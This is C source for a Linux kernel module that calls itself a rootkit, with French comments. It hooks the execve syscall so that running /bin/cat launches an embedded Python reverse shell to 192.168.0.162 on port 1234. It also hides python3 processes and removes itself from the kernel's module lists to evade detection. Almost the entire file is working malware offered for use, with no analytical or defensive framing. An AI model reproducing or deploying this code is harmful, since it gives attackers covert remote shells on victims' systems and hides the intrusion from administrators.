#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kmod.h>
#include <linux/version.h>
#include <linux/namei.h>

#include "./ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Manolo");
MODULE_DESCRIPTION("Rootkit déclenchant sur commande cat");
MODULE_VERSION("0.03");

// Code Python encapsulé en tant que chaîne
static char *python_code = "import socket, subprocess, os, pty\n"
                           "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                           "s.connect(('192.168.0.162', 1234))\n"
                           "os.dup2(s.fileno(), 0)\n"
                           "os.dup2(s.fileno(), 1)\n"
                           "os.dup2(s.fileno(), 2)\n"
                           "pty.spawn('sh')\n";

// Pointeur vers l'original du syscall `execve`
static asmlinkage long (*orig_execve)(const struct pt_regs *);

// Fonction pour exécuter le script Python
static int run_python_script(void)
{
    char *argv[] = { "/usr/bin/python3", "-c", python_code, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

// Vérifie si la commande exécutée est `cat`
static int is_cat_command(const char __user *filename)
{
    char kernel_filename[256];
    if (strncpy_from_user(kernel_filename, filename, sizeof(kernel_filename)) > 0) {
        if (strstr(kernel_filename, "/bin/cat") != NULL) {
            return 1; // Commande `cat` détectée
        }
    }
    return 0;
}

// Hook du syscall `execve`
asmlinkage long hook_execve(const struct pt_regs *regs)
{
    const char __user *filename = (const char __user *)regs->di;

    // Vérifie si la commande exécutée est `cat`
    if (is_cat_command(filename)) {
        run_python_script(); // Exécute le script Python
    }

    // Appel le syscall original
    return orig_execve(regs);
}

// Définition du hook pour ftrace
static struct ftrace_hook hooks[] = {
    HOOK("sys_execve", hook_execve, &orig_execve), // Hook sur `execve`
};

void hide_task(struct task_struct *task)
{
    // Retire le processus de la liste des tâches
    list_del(&task->tasks);
}


static int __init rootkit_init(void)
{
    int err;
    struct list_head *prev_module;
    struct list_head *next_module;
    struct module *mod;
    struct task_struct *task; // Déplace cette déclaration ici

    // Installation du hook
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    // Masquer les processus Python exécutant le script
    for_each_process(task) {
        if (strcmp(task->comm, "python3") == 0) {
            // Appelle une fonction pour masquer le processus
            hide_task(task);
        }
    }

    // Masquer le module de la liste des modules chargés
    mod = THIS_MODULE;
    prev_module = mod->list.prev;
    next_module = mod->list.next;

    // Supprime le module de la liste pour le masquer dans /proc/modules
    list_del(&mod->list);

    // Masquer l'entrée du module dans /sys/module
    kobject_del(&mod->mkobj.kobj);
    return 0;
}


static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks)); // Retrait du hook
}

module_init(rootkit_init);
module_exit(rootkit_exit);
